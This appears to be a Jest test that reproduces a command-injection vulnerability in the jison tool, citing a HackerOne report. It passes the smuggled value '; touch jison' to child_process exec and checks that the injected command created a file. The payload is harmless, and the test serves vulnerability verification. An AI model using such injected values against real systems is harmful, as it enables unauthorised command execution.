//https://hackerone.com/reports/690010
test("Command Injection in jison", (done) => {
  expect.assertions(2);
  exec = require("child_process").exec;
  const fs = require("fs");
  const path = "./jison";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let command = "; touch jison";
  exec("jison " + command, function (error) {
    // if (error) {
    //   console.log(error);
    //   return;
    // }

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
